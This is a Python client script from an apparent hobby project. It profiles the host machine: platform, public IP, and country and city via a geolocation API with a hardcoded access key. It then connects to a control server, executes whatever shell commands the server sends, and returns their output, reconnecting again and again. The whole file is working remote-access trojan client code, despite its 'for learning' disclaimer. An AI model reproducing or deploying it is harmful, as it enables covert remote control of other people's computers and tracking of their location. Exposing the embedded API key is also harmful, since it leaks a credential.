#!/usr/bin/python3
# -*- coding: utf-8 -*-

'''
    File name: client.py
    Author: MathIsSimple
    Python Version: 3.7.0
    Disclaimer: I created this project to learn about custom encoding and python sockets,
                this projected isn't made to be used for maliscious intent. Do so at your own risk
'''

# Import core python needed modules

import socket
import time
import requests
import platform as plat
import sys

sys.path.insert(0, './../lib/')

# Import needed custom python modules

from hasing import modify
from terminal import decodeCommandOutput
from terminal import getCommandOutput

# Global Variables

Connected = False
GatheredInfo = False
sock = None
PORT = 64500
Info = None

# All of the functions needed for this project to work

def createSocket(HOST, PORT):
    global Connected

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((HOST, PORT))
        Connected = True
    except ConnectionRefusedError:
        # If we've failed to connect or the reconnect to a server, then wait 5s before trying again

        print("Error While Trying To Reconnect")
        print("Waiting 5s")
        time.sleep(5)

    return sock

def getInfo():
    global GatheredInfo

    platform = plat.platform()
    system   = plat.system()

    # Get the api from ipify.org

    ip = requests.get("https://api.ipify.org/?format=json").json()["ip"]    

    # Get information about the info with api.ipstack.com

    ip_info = requests.get("http://api.ipstack.com/"+ip+"?access_key=5666d16d47c94935142e312df7c1afd1&format=1").json()
    continent = ip_info["continent_name"]
    country = ip_info["country_name"]
    city = ip_info["city"]

    GatheredInfo = True

    return   [platform, system, ip, continent, country, city, "END"]

def receiveData():
    global Connected

    if Connected == True:
        try:
            data = modify(sock.recv(1024).decode("utf-8", 'ignore'))
            return data
        except ConnectionResetError:
            # If we've lost connexion, then set connnected to false

            print("Disconnected")
            Connected = False
    
    return ""

def sendData(data):
    global Connected
    global sock

    if Connected == True:
        data = modify(str(data))
        data = data.encode()
        sock.sendall(data)

def sendArray(data):
    global Connected

    for content in data:
        if Connected == False:
            break
        else:
            sendData(content)
            time.sleep(0.05)

def handleCommands():
    global Connected

    while True:
        if Connected == False:
            break

        data = receiveData()

        if Connected == False:
            break

        if data:
            if data != "END":
                print("Command : " + data)
                output = getCommandOutput(data)
                sendArray(output)
            else:
                print("Closing ...")
                sock.close()
                exit(0)

def start():
    global sock
    global Connected
    global GatheredInfo
    global PORT
    global Info

    # If we have already gathered info about the computer, then don't fetch it again

    if GatheredInfo == False:
        Info = getInfo()
        print("Gathered Info")

    # Create the socket to talk with the server

    sock = createSocket("127.0.0.1", PORT)

    if Connected:
        print("Created Connexion With Server")
        sendArray(Info)
        print("Sent Info")
        print("Handling Commands")
        handleCommands()

    # Attempt to reconnect when the connection was lost

    while Connected == False:
        sock = None
        print("Attempting reconnect")

        # Try to start the programm over in hope that the server is back up

        start()

# Starting the program

start()